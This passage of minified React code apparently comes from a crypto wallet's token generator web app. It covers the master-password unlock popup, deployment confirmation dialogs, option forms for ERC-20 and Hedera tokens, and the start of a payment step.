        }, O.createElement("h2", null, "Create Guarda wallet to launch a token"), O.createElement("p", null, "Please, create or restore a wallet to start using the Generator. You will need this wallet later for transferring the service payment and managing your own token. Your Guarda wallet makes it easy to access your crypto assets and interact with the blockchain. Guarda does not have any access to your funds.", O.createElement("br", null), O.createElement("br", null), "Restore your existing Guarda Wallet by importing the private key from another service, or create a new Wallet right now!"), O.createElement("a", {
            target: "_blank",
            href: "/app/create"
        }, O.createElement(Yl, {
            className: Ure,
            size: "big",
            color: "blue"
        }, "Create a new wallet")), O.createElement("a", {
            target: "_blank",
            href: "/app/restore"
        }, O.createElement(Yl, {
            className: Ure,
            size: "big",
            color: "transparent-blue"
        }, "Restore or Import")), O.createElement("div", {
            className: Mre
        }, O.createElement("ul", null, O.createElement("li", null, O.createElement("a", {
            href: "https://support.guarda.com/getting-started/what-is-guarda",
            target: "_blank",
            rel: "noopener noreferrer"
        }, "What exactly is Guarda Wallet?")), O.createElement("li", null, O.createElement("a", {
            href: "https://support.guarda.com/security/how-to-import-a-wallet-with-its-private-key",
            target: "_blank",
            rel: "noopener noreferrer"
        }, "How to import another wallet here?"))))))
          , Gre = "popup-password_popupContent_2EvpR"
          , Vre = "popup-password_popupUl_zQGZV"
          , Kre = "popup-password_whiteBlock_3bySi"
          , Hre = "popup-password_inputConfirmation_3uOgC"
          , zre = "popup-password_loader_XHIaq"
          , jre = "popup-password_popupFieldsUnlock_OgAVl"
          , $re = "popup-password_popupFieldsCreate_2nWxT"
          , Zre = "popup-password_shutUpAndTakeMyMoney_27ZRq"
          , Yre = "popup-password_errorMasterPasswordPopup_W4Qsk"
          , qre = "popup-password_inlineButtons_1SlQH"
          , Xre = "popup-password_checkboxBlock_2Y5u0"
          , Qre = "popup-password_checkboxText_1T6cb"
          , Jre = "popup-password_linkWrapper_1fB7F"
          , ele = "popup-password_textCenter_2dp-j"
          , tle = "popup-password_flexBoxCenter_3Mjd5"
          , popup_password_PopupConfirmPassword = e => {
            const t = (0,
            $.I0)()
              , a = (0,
            $.v9)(oe.Yq)
              , [n,r] = (0,
            O.useState)("")
              , [l,s] = (0,
            O.useState)(!1)
              , i = (0,
            O.useRef)(null)
              , handleClose = () => {
                r("");
                e.onClose()
            }
              , handleUnlock = async () => {
                if (t(checkMasterPassword(n))) {
                    r("");
                    await e.onSuccessPassword(n)
                } else {
                    var a;
                    s(!0);
                    setTimeout(( () => s(!1)), 2e3);
                    r("");
                    null === (a = i.current) || void 0 === a || a.focus()
                }
            }
              , unlockForm = () => O.createElement("div", {
                className: Ht()(Gre, Kre)
            }, O.createElement("h2", null, "Unlock your Guarda backup"), O.createElement("p", null, "Please, unlock the backup of your Guarda Wallet. You will need this wallet later for transferring the service payment and managing your own token."), O.createElement("div", null, O.createElement(label, null, "Enter you password:"), O.createElement("div", {
                className: jre
            }, O.createElement(Ea, {
                ref: i,
                autoFocus: !0,
                type: "password",
                value: n,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return r(t)
                }
                ,
                onEnter: handleUnlock,
                placeholder: "Password",
                autoComplete: "off",
                className: Hre
            }), O.createElement(Yl, {
                color: "blue",
                onClick: handleUnlock
            }, "Unlock")), l && O.createElement("div", {
                className: Yre
            }, "Password is invalid")));
            return O.createElement(aa, {
                visible: e.visible,
                unclosable: !0,
                width: 515,
                onClose: handleClose
            }, a ? unlockForm() : O.createElement(create_wallet_block, null))
        }
          , ale = popup_password_PopupConfirmPassword
          , ContinuePublicationDialog = e => {
            let {onConfirm: t, onCancel: a, tokenInfo: n} = e;
            const [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)()
              , getCheckBoxValidationStatus = () => s && !r
              , o = (0,
            O.useCallback)((e => () => {
                l(e);
                e && s && i(e)
            }
            ), [s])
              , handleConfirm = e => {
                r && t(n, e);
                i(!0)
            }
              , handleCancel = e => a(n, e);
            return O.createElement("div", {
                className: Ht()(Gre, Kre)
            }, O.createElement("h2", null, null == n ? void 0 : n.symbol, " token minting is in progress. You can:"), O.createElement("ul", {
                className: Vre
            }, O.createElement("li", null, "Continue to deploy. Fees may apply unless already paid."), O.createElement("li", null, "Cancel. To refund previously charged fees – contact support.")), O.createElement("div", {
                className: Xre
            }, O.createElement(mp, {
                checked: r,
                onChange: o(!r),
                isInvalid: getCheckBoxValidationStatus()
            }, O.createElement("span", {
                className: Qre
            }, "I realize that a fee might be charged to continue."))), O.createElement("div", {
                className: qre
            }, O.createElement(Yl, {
                color: "blue",
                onClick: handleConfirm
            }, "Continue"), O.createElement(Yl, {
                color: "red",
                onClick: handleCancel
            }, "Cancel")))
        }
          , useContinuePublicationDialog = () => {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)({})
              , r = (0,
            O.useCallback)((e => {
                null != e && e.tokenInfo && n(null == e ? void 0 : e.tokenInfo)
            }
            ), [])
              , l = (0,
            O.useCallback)((e => () => t(e)), [t])
              , s = (0,
            O.useCallback)((t => {
                let {onConfirm: n, onCancel: r} = t;
                return O.createElement(aa, {
                    onClose: l(!1),
                    unclosable: !0,
                    visible: e,
                    width: 450
                }, O.createElement(ContinuePublicationDialog, {
                    onConfirm: n,
                    onCancel: r,
                    tokenInfo: a
                }))
            }
            ), [l, e, a]);
            return {
                isOpen: e,
                updateDialogData: r,
                toggleDialog: l,
                Dialog: s
            }
        }
          , ConfirmDeployDialog = e => {
            let {onConfirm: t, onCancel: a, tokenInfo: n} = e;
            const [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)()
              , getCheckBoxValidationStatus = () => s && !r
              , o = (0,
            O.useCallback)((e => () => {
                l(e);
                e && s && i(e)
            }
            ), [s])
              , handleConfirm = e => {
                r && t(n, e);
                i(!0)
            }
              , handleCancel = e => a(n, e);
            return O.createElement("div", {
                className: Ht()(Gre, Kre)
            }, O.createElement("h2", null, "It seems that you have already published ", null == n ? void 0 : n.symbol, " token."), O.createElement("p", {
                className: ele
            }, "Do you want to create a new token?"), O.createElement("div", {
                className: Ht()(Xre, tle)
            }, O.createElement(mp, {
                checked: r,
                onChange: o(!r),
                isInvalid: getCheckBoxValidationStatus()
            }, O.createElement("span", {
                className: Qre
            }, "I realize that a fee will be charged to continue."))), O.createElement("div", {
                className: qre
            }, O.createElement(Yl, {
                color: "red",
                onClick: handleConfirm
            }, "Continue"), O.createElement(Yl, {
                color: "blue",
                onClick: handleCancel
            }, "Cancel")))
        }
          , useConfirmDeployDialog = () => {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)({})
              , r = (0,
            O.useCallback)((e => {
                null != e && e.tokenInfo && n(null == e ? void 0 : e.tokenInfo)
            }
            ), [])
              , l = (0,
            O.useCallback)((e => () => t(e)), [t])
              , s = (0,
            O.useCallback)((t => {
                let {onConfirm: n, onCancel: r} = t;
                return O.createElement(aa, {
                    onClose: l(!1),
                    unclosable: !0,
                    visible: e,
                    width: 450
                }, O.createElement(ConfirmDeployDialog, {
                    onConfirm: n,
                    onCancel: r,
                    tokenInfo: a
                }))
            }
            ), [l, e, a]);
            return {
                isOpen: e,
                updateDialogData: r,
                toggleDialog: l,
                Dialog: s
            }
        }
        ;
        function token_state_api_defineProperty(e, t, a) {
            (t = token_state_api_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function token_state_api_toPropertyKey(e) {
            var t = token_state_api_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function token_state_api_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const nle = undefined
          , rle = `${(M.CM ? (0,
        bu.ZP)("token-creator-engine-url") : null) || "/"}api/v3/token-generator/`;
        class TokenStateApi {
            static async saveState(e) {
                return this.api.post("/state", e)
            }
            static async findState(e) {
                return this.api.get("/state/find", {
                    params: e
                })
            }
            static async deleteState(e) {
                return this.api.delete(`/state/${e}`)
            }
        }
        token_state_api_defineProperty(TokenStateApi, "api", Jf().create({
            baseURL: rle
        }));
        const Step_Step = e => {
            let {children: t} = e;
            const [a,n] = (0,
            O.useState)(!1)
              , r = (0,
            $.v9)(oe.Oj)
              , l = (0,
            $.v9)(oe.Yq)
              , s = (0,
            $.v9)($c)
              , i = (0,
            $.v9)(selectCreationData)
              , o = (0,
            $.I0)()
              , c = (0,
            j.k6)()
              , u = !r || !l
              , {Dialog: d, toggleDialog: m, updateDialogData: p, isOpen: f} = useContinuePublicationDialog()
              , {Dialog: E, toggleDialog: h, updateDialogData: g} = useConfirmDeployDialog()
              , y = (0,
            O.useCallback)((async e => {
                const {wallet: t, token: a, network: n} = e
                  , {data: r} = await TokenStateApi.findState({
                    address: t.address,
                    family: n,
                    ticker: a.symbol
                });
                return r.shift()
            }
            ), [])
              , v = (0,
            O.useCallback)((async e => {
                const t = {
                    tokenInfo: null == e ? void 0 : e.token
                }
                  , a = undefined;
                if (await y(e)) {
                    g(t);
                    h(!0)()
                } else {
                    p(t);
                    m(!0)()
                }
            }
            ), [y, h, g, p, m])
              , _ = (0,
            O.useCallback)((async () => {
                if (f)
                    m(!1)();
                else {
                    h(!1)();
                    const e = {
                        ...i,
                        internalState: void 0,
                        exchange: void 0
                    };
                    await o(Wre(e));
                    await o(setSecureData(je, e))
                }
                c.replace({
                    pathname: "/app/token-generator/process"
                })
            }
            ), [f, c, m, h, i, o])
              , w = (0,
            O.useCallback)((async () => {
                m(!1)();
                h(!1)();
                if (i) {
                    const e = {
                        internalState: {
                            ...i.internalState,
                            step: "CANCELED_BY_USER"
                        },
                        serviceFee: i.serviceFee,
                        network: i.network,
                        token: i.token,
                        wallet: i.wallet.address,
                        exchange: i.exchange
                    };
                    e.exchange || delete e.exchange;
                    await U.nW.post("/api/v1/internal/token-generator/log", {
                        logData: e
                    }).catch()
                }
                await o(Wre(null));
                await o(setSecureData(je, null));
                c.replace({
                    pathname: "/app/token-generator/"
                })
            }
            ), [m, o, c, i])
              , b = (0,
            O.useCallback)((async () => {
                const e = await o(restoreCreationData());
                e && (f || await v(e))
            }
            ), [f])
              , k = (0,
            O.useCallback)((async () => {
                const e = await o(restoreStorage(null));
                await o(restoreWallets(e.wallets))
            }
            ), [])
              , S = (0,
            O.useCallback)((async e => {
                await o(ie.setMasterPassword({
                    masterPassword: e
                }));
                await k();
                n(!1);
                await b()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    if (c.location.pathname.endsWith("process")) {
                        c.replace({
                            pathname: "/app/token-generator"
                        });
                        return window.location.reload()
                    }
                    n(!0)
                } else
                    restore();
                async function restore() {
                    s.length || await k();
                    c.location.pathname.endsWith("process") || await b()
                }
            }
            ), [u]);
            return O.createElement(O.Fragment, null, O.createElement(ale, {
                visible: a,
                onClose: () => n(!1),
                onSuccessPassword: S
            }), O.createElement(E, {
                onConfirm: _,
                onCancel: w
            }), O.createElement(d, {
                onConfirm: _,
                onCancel: w
            }), !u && t)
        }
          , lle = Step_Step
          , sle = undefined
          , ile = O.memo(( () => {
            const {symbol: e, name: t, tokenType: a} = useLocationSearch()
              , n = (0,
            j.k6)()
              , r = (0,
            O.useMemo)(( () => {
                const e = ere.getSupportedToken();
                return e && Array.isArray(e) ? e.map((e => ({
                    ...e,
                    title: `${e.title} (${e.type})`
                }))) : []
            }
            ), [])
              , l = (0,
            O.useMemo)(( () => {
                const n = a && a in LW ? a : LW.eth_erc20;
                return a ? {
                    symbol: e,
                    name: t,
                    type: n
                } : {
                    type: n
                }
            }
            ), [a, e, t])
              , s = (0,
            O.useCallback)((e => {
                n.push({
                    pathname: "/app/token-generator/options",
                    search: objectToString(e)
                })
            }
            ), [n]);
            return O.createElement(lle, null, O.createElement(Nre, {
                onSubmit: s,
                defaultValues: l,
                supportTokens: r
            }), O.createElement("div", {
                className: "col-xs-6 col-xs-offset-1"
            }, O.createElement("p", {
                className: Ht()("row", bre)
            }, "That's how your token will look like on main crypto services"), O.createElement(dre, null)), O.createElement(stepper, {
                step: 1
            }))
        }
        ))
          , ole = {
            headingWrapper: "set-options_headingWrapper_2K8kb",
            formFieldWithDescription: "set-options_formFieldWithDescription_qlam7",
            formFieldDescription: "set-options_formFieldDescription_2VL42",
            amountDescription: "set-options_amountDescription_3mGoa",
            advancedOptions: "set-options_advancedOptions_1eM26",
            backButton: "set-options_backButton_2gXZT pages_backButton_2UZP6",
            confirmBlock: "set-options_confirmBlock_1UdyE",
            textError: "set-options_textError_U7Q72",
            message: "set-options_message_2pbhQ",
            subTitle: "set-options_subTitle_2DINC",
            warningIcon: "set-options_warningIcon_2oIm-",
            hidden: "set-options_hidden_23SR7",
            fieldset: "set-options_fieldset_34lpK",
            checkbox: "set-options_checkbox_wpYfF",
            fieldError: "set-options_fieldError_bwIns"
        }
          , cle = {
            initialSupply: {
                validate: e => {
                    const t = parseInt(e, 10);
                    return Number.isNaN(t) ? "Supply must be integer number" : t < 0 ? "Supply value must be a positive number" : Number(t) % 1 == 0 || "Supply value must be integer number"
                }
            },
            decimals: {
                validate: e => {
                    if (!e)
                        return !0;
                    const t = parseInt(e, 10);
                    return Number.isNaN(t) ? "Decimals must be integer number" : Number(t) % 1 != 0 ? "Decimals value must be integer number" : !(t < 0 || t > 255) || "Decimals value must be number in range from 0 to 255"
                }
            },
            freezeDefault: {}
        }
          , EthOptionForm = e => {
            let {onSubmit: t, defaultValues: a={}} = e;
            const [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            C$.cI)({
                defaultValues: a
            });
            return O.createElement("form", {
                onSubmit: l.handleSubmit(t)
            }, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(BackButton, {
                className: ole.backButton
            }), O.createElement("div", {
                className: ole.headingWrapper
            }, "Set up token supply")), O.createElement("div", {
                className: "col-xs-4 col-xs-offset-4"
            }, O.createElement(label, null, "Amount of tokens to issue"), O.createElement(C$.Qr, {
                name: "initialSupply",
                control: l.control,
                rules: cle.initialSupply,
                defaultValue: null == a ? void 0 : a.initialSupply,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.isTouched && i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        type: "number",
                        autoFocus: !0,
                        placeholder: "Number",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }), O.createElement("p", {
                className: ole.amountDescription
            }, "Pick the number of tokens to issue. Base the decision on your personal preferences or the rules of your loyalty programme"), O.createElement("div", {
                className: Ht()({
                    [ole.hidden]: n
                })
            }, O.createElement("span", {
                className: ole.advancedOptions,
                onClick: () => r(!0)
            }, "Advanced options")), O.createElement("div", {
                className: Ht()({
                    [ole.hidden]: !n
                })
            }, O.createElement(C$.Qr, {
                name: "decimals",
                control: l.control,
                rules: cle.decimals,
                defaultValue: null == a ? void 0 : a.decimals,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.isTouched && i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        type: "number",
                        placeholder: "Decimals, 18 by default",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }), O.createElement("p", {
                className: ole.amountDescription
            }, "Vary decimals to set up a number your token can be divided by"), O.createElement(C$.Qr, {
                name: "freezeDefault",
                control: l.control,
                rules: cle.freezeDefault,
                defaultValue: null == a ? void 0 : a.freezeDefault,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(tooltip, {
                        text: "Press if you want to have an option to stop all the transactions of your token in the future",
                        width: "200px"
                    }, O.createElement(mp, {
                        className: ole.freeze,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Freeze transactions"))
                }
            })), O.createElement("div", {
                className: ole.confirmBlock
            }, O.createElement(Yl, {
                color: "blue",
                size: "large",
                type: "submit"
            }, "Continue"), O.createElement("span", null, "You cannot change supply once the token is released"))), O.createElement(stepper, {
                step: 2
            }))
        }
          , ule = EthOptionForm
          , dle = /[^\p{L}\p{N}\p{P}\p{Z}^$\n]/gu
          , form_hbar_hasEmoji = e => {
            const t = e.replace(dle, "");
            return e.length !== t.length
        }
          , mle = "9223372036854775808"
          , form_hbar_VALIDATOR = e => {
            let {decimals: t} = e;
            return {
                initialSupply: {
                    validate: e => {
                        const a = Number(e)
                          , n = t || 8;
                        if (Number.isNaN(a))
                            return "Supply must be integer number";
                        if (a < 0)
                            return "Supply value must be a positive number";
                        if (!Number.isInteger(a))
                            return "Supply value must be integer number";
                        const r = (0,
                        Ko.lt)((0,
                        Ko.$q)(e, `1e${n}`), mle)
                          , l = parseInt((0,
                        Ko.hC)(mle, `1e${n}`));
                        return !!r || `The total token supply with ${n} decimal places must be less than ${l}. Decrease the supply or decimals.`
                    }
                },
                decimals: {
                    validate: e => {
                        if (!e)
                            return !0;
                        const t = parseInt(e, 10);
                        return Number.isNaN(t) ? "Decimals must be integer number" : Number(t) % 1 != 0 ? "Decimals value must be integer number" : !(t < 0 || t > 16) || "Decimals value must be number in range from 0 to 16"
                    }
                },
                adminKey: {},
                kycKey: {},
                wipeKey: {},
                supplyKey: {},
                customFee: {},
                memo: {
                    validate: e => !e || (e.length > 49 ? "No more than 50 symbols" : !form_hbar_hasEmoji(e) || "Emoji doesn't support")
                }
            }
        }
          , HbarOptionForm = e => {
            var t, a, n, r, l, s;
            let {onSubmit: i, defaultValues: o} = e;
            const [c,u] = (0,
            O.useState)(!1)
              , d = (0,
            C$.cI)({
                defaultValues: o
            })
              , {handleSubmit: m, watch: p, trigger: f, formState: {errors: E}} = d
              , h = {
                supply: p("initialSupply"),
                decimals: p("decimals")
            };
            (0,
            O.useEffect)(( () => {
                if (h.supply) {
                    f("decimals");
                    f("initialSupply")
                }
            }
            ), [h.supply, h.decimals]);
            const g = (0,
            O.useCallback)((e => t => {
                const a = {
                    ...t,
                    decimals: isNaN(Number(t.decimals)) ? 8 : t.decimals
                };
                e(a)
            }
            ), []);
            return O.createElement("form", {
                onSubmit: m(g(i))
            }, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(BackButton, {
                className: ole.backButton
            }), O.createElement("div", {
                className: ole.headingWrapper
            }, "Set up token supply")), O.createElement("div", {
                className: "col-xs-4 col-xs-offset-4"
            }, O.createElement(label, null, "Amount of tokens to issue"), O.createElement(C$.Qr, {
                name: "initialSupply",
                control: d.control,
                rules: form_hbar_VALIDATOR(h).initialSupply,
                defaultValue: null == o ? void 0 : o.initialSupply,
                render: e => {
                    var t, a;
                    let {field: {value: n, name: r, ref: l, onChange: s, onBlur: i}, fieldState: o} = e;
                    return O.createElement(pa, {
                        isInvalid: !(null !== (t = E.decimals) && void 0 !== t && t.message) && !!n && o.isTouched && o.invalid,
                        message: null == o || null === (a = o.error) || void 0 === a ? void 0 : a.message,
                        className: ole.fieldError
                    }, O.createElement(Ea, {
                        type: "number",
                        onWheel: e => e.currentTarget.blur(),
                        autoFocus: !0,
                        placeholder: "Number",
                        value: n || "",
                        name: r,
                        onChange: s,
                        onBlur: i,
                        ref: l
                    }))
                }
            }), O.createElement("p", {
                className: ole.amountDescription
            }, "Pick the number of tokens to issue. Base the decision on your personal preferences or the rules of your loyalty programme"), O.createElement("div", {
                style: {
                    marginTop: "60px"
                }
            }, O.createElement(label, null, "Precision"), O.createElement(C$.Qr, {
                name: "decimals",
                control: d.control,
                rules: form_hbar_VALIDATOR(h).decimals,
                defaultValue: null == o ? void 0 : o.decimals,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.isTouched && i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        type: "number",
                        onWheel: e => e.currentTarget.blur(),
                        placeholder: "Decimals, 8 by default",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }), O.createElement("p", {
                className: ole.amountDescription
            }, "Set up a number your token can be divided by")), O.createElement(C$.Qr, {
                name: "autoRenewalKey",
                control: d.control,
                rules: null === (t = form_hbar_VALIDATOR(h)) || void 0 === t ? void 0 : t.autoRenewalKey,
                defaultValue: null == o ? void 0 : o.autoRenewalKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Enable auto-renewal")
                }
            }), O.createElement("p", {
                className: ole.amountDescription
            }, "Each token in the Hedera network has an expiration date. You can enable auto-renewal or renew the expiration date manually by sending a specific transaction every 3 months. In both cases, you will have to pay a network fee."), O.createElement("div", {
                className: Ht()({
                    [ole.hidden]: c
                })
            }, O.createElement("span", {
                className: ole.advancedOptions,
                onClick: () => u(!0)
            }, "Advanced options")), O.createElement("div", {
                className: Ht()({
                    [ole.hidden]: !c
                })
            }, O.createElement(ui_message, {
                className: ole.message,
                type: "warning"
            }, O.createElement("div", {
                className: ole.warningIcon
            }), "Please note that you can enable these additional features but you can’t interact with them on Guarda after creation. Leave empty to set the default settings. Only the token creator’s wallet will be eligible to update the token information."), O.createElement(label, null, "Additional features"), O.createElement(C$.Qr, {
                name: "adminKey",
                control: d.control,
                rules: null === (a = form_hbar_VALIDATOR(h)) || void 0 === a ? void 0 : a.adminKey,
                defaultValue: null == o ? void 0 : o.adminKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Allow the creator to update token info.")
                }
            }), O.createElement(C$.Qr, {
                name: "kycKey",
                control: d.control,
                rules: form_hbar_VALIDATOR(h).kycKey,
                defaultValue: null == o ? void 0 : o.kycKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Grant or revoke KYC of an account for the token's transactions. The creator will decide which accounts can receive or send tokens")
                }
            }), O.createElement(C$.Qr, {
                name: "wipeKey",
                control: d.control,
                rules: form_hbar_VALIDATOR(h).wipeKey,
                defaultValue: null == o ? void 0 : o.wipeKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Enable wiping an account's tokens and burn them")
                }
            }), O.createElement(C$.Qr, {
                name: "freezeDefault",
                control: d.control,
                rules: null === (n = form_hbar_VALIDATOR(h)) || void 0 === n ? void 0 : n.freezeDefault,
                defaultValue: null == o ? void 0 : o.freezeDefault,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Enable token transaction freezing")
                }
            }), O.createElement(C$.Qr, {
                name: "supplyKey",
                control: d.control,
                rules: null === (r = form_hbar_VALIDATOR(h)) || void 0 === r ? void 0 : r.supplyKey,
                defaultValue: null == o ? void 0 : o.supplyKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "Enable changing token supply (mint, burn)")
                }
            }), O.createElement(C$.Qr, {
                name: "freezeKey",
                control: d.control,
                rules: null === (l = form_hbar_VALIDATOR(h)) || void 0 === l ? void 0 : l.freezeKey,
                defaultValue: null == o ? void 0 : o.freezeKey,
                render: e => {
                    let {field: {value: t, name: a, ref: n, onChange: r, onBlur: l}} = e;
                    return O.createElement(mp, {
                        className: ole.checkbox,
                        checked: !!t,
                        value: t || "",
                        name: a,
                        onChange: r,
                        onBlur: l,
                        ref: n
                    }, "The account must be unfrozen to receive the token")
                }
            }), O.createElement("div", {
                className: ole.fieldset
            }, O.createElement("p", {
                className: ole.freeze
            }, "Short public description of the token (optional)"), O.createElement(C$.Qr, {
                name: "memo",
                control: d.control,
                rules: null === (s = form_hbar_VALIDATOR(h)) || void 0 === s ? void 0 : s.memo,
                defaultValue: null == o ? void 0 : o.memo,
                render: e => {
                    var t;
                    let {field: {value: a, name: n, ref: r, onChange: l, onBlur: s}, fieldState: i} = e;
                    return O.createElement(pa, {
                        isInvalid: i.isTouched && i.invalid,
                        message: null == i || null === (t = i.error) || void 0 === t ? void 0 : t.message
                    }, O.createElement(Ea, {
                        placeholder: "Add memo",
                        value: a || "",
                        name: n,
                        onChange: l,
                        onBlur: s,
                        ref: r
                    }))
                }
            }))), O.createElement("div", {
                className: ole.confirmBlock
            }, O.createElement(Yl, {
                color: "blue",
                size: "large",
                type: "submit"
            }, "Continue"))), O.createElement(stepper, {
                step: 2
            }))
        }
          , ple = HbarOptionForm
          , fle = new Map([[LW.eth_erc20, ule], [LW.hbar_hbar, ple]])
          , Ele = undefined
          , set_options_forms = e => {
            const {type: t} = e;
            return O.useMemo(( () => fle.get(t)), [t])
        }
          , normalizeFormData = e => e ? Object.entries(e).reduce(( (e, t) => {
            let[a,n] = t;
            switch (typeof n) {
            case "boolean":
                return {
                    ...e,
                    [a]: +n || 0
                };
            case "undefined":
                return e;
            default:
                return {
                    ...e,
                    [a]: n
                }
            }
        }
        ), {}) : {}
          , hle = undefined
          , gle = O.memo(( () => {
            const {tokenType: e} = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = set_options_forms({
                type: e
            })
              , r = (0,
            O.useCallback)((e => {
                const n = stringToObject(a.search)
                  , r = objectToString({
                    ...n,
                    ...normalizeFormData(e)
                });
                t.replace({
                    pathname: "/app/token-generator/payment",
                    search: r
                })
            }
            ), [t, a.search]);
            return O.createElement(lle, null, O.createElement(n, {
                onSubmit: r
            }))
        }
        ))
          , yle = "payment_headingWrapper_A3AEw"
          , vle = "payment_subHeadingWrapper_35VeP"
          , _le = "payment_topup_Jxbpg"
          , wle = "payment_addButton_29lra"
          , ble = "payment_disable_1PJNZ"
          , kle = "payment_currencyName_NJLht"
          , Sle = "payment_currencyNameItem_gMykJ"
          , Cle = "payment_notEnoughFundsLabel_2mWHP"
          , Nle = "payment_listTicker_2o06G"
          , Tle = "payment_tip_3pEIS"
          , Ale = "payment_backButton_3M1I4 pages_backButton_2UZP6"
          , xle = "payment_currencyAmount_1EUA2"
          , Ile = "payment_bestOfTheBest_21MSU"
          , Ple = "payment_centerButton_2C6to"
          , Lle = "payment_linkCreate_3NWYB"
          , Fle = "USD"
          , WalletItem = e => function RenderWalletItem(t, a) {
            const {currency: n, title: r, balance: l, fiatAmount: s} = t
              , i = !e(t);
            return O.createElement(O.Fragment, null, O.createElement(IconCurrency, {
                currency: n,
                className: Ht()(a.listTicker, Jl.listTicker, {
                    [Jl.isDisabled]: i,
                    [Jl.isInsufficientFunds]: i
                })
            }), O.createElement("div", {
                className: Ht()(Jl.currencyInfo, {
                    [Jl.isInsufficientFunds]: i
                })
            }, O.createElement("span", {
                className: Jl.titleContainer
            }, O.createElement("span", {
                className: Jl.titleWrapper
            }, r)), O.createElement("div", null, i ? "Not enough funds" : O.createElement(O.Fragment, null, (0,
            Ko.yF)(l), " ", (0,
            be.xG)(n), " (", O.createElement(fiat_estimate_FiatEstimate, {
                value: s
            }), " ", Fle, ") "))))
        }
        ;
        function form_extends() {
            form_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return form_extends.apply(this, arguments)
        }
        const hasEnoughWalletByNetwork = e => {
            let {network: t, type: a} = e;
            return e => {
                const n = e
                  , r = `${t}_${a.toLowerCase()}`
                  , l = ere.getServiceFee(r)
                  , s = undefined;
                return +(n.currency === t ? null == n ? void 0 : n.fiatAmount : null == n ? void 0 : n.availableFiatAmount) > l
            }
        }
          , form_Form = e => {
            var t, a, n, r, l;
            const s = (0,
            j.k6)()
              , i = useLocationSearch()
              , {children: o, defaultValues: c, exchangeWallets: u, targetWallets: d, supportWallet: m, tokenInfo: p, serviceFee: f} = e
              , E = (0,
            $.I0)()
              , {convertToCrypto: h} = useConverter()
              , [g,y] = (0,
            O.useState)(!1)
              , v = (0,
            O.useMemo)(( () => {
                var e;
                return null == p || null === (e = p.network) || void 0 === e ? void 0 : e.toUpperCase()
            }
            ), [null == p ? void 0 : p.network])
              , _ = (0,
            C$.cI)({
                defaultValues: c
            })
              , w = (0,
            O.useMemo)(( () => hasEnoughWalletByNetwork(p)), [p])
              , b = (0,
            $.v9)((e => {
                const t = undefined;
                return [{
